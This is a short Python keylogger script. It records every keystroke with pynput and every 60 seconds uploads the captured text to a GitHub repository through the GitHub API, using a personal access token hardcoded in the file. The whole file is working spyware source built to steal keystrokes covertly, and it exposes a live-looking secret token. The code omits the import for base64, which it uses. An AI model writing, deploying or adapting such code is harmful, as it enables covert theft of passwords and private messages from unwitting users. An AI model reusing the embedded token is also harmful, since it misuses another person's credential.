import threading
import time
from pynput import keyboard
import requests

log_file = "keystrokes.log"
github_repo = "https://api.github.com/repos/amineshx/MC/keylogger/keystrokes.log"
github_token = "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"

keystrokes = []

def on_press(key):
    try:
        keystrokes.append(key.char)
    except AttributeError:
        keystrokes.append(str(key))

def send_keystrokes():
    while True:
        time.sleep(60)  # Send data every 60 seconds
        data = ''.join(keystrokes)
        try:
            headers = {"Authorization": "token " + github_token}
            content = requests.get(github_repo, headers=headers).json()
            current_sha = content["sha"]
            encoded_content = base64.b64encode(data.encode()).decode()
            commit_message = "Update keystrokes log"
            new_content = {"message": commit_message, "content": encoded_content, "sha": current_sha}
            response = requests.put(github_repo, headers=headers, json=new_content)
            if response.status_code == 200:
                # Clear keystrokes if data was successfully sent
                keystrokes.clear()
        except Exception as e:
            print("Error sending data:", e)

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    # Start keylogger thread
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

    # Start sending data thread
    send_data_thread = threading.Thread(target=send_keystrokes)
    send_data_thread.start()

    # Wait for threads to finish
    keylogger_thread.join()
    send_data_thread.join()
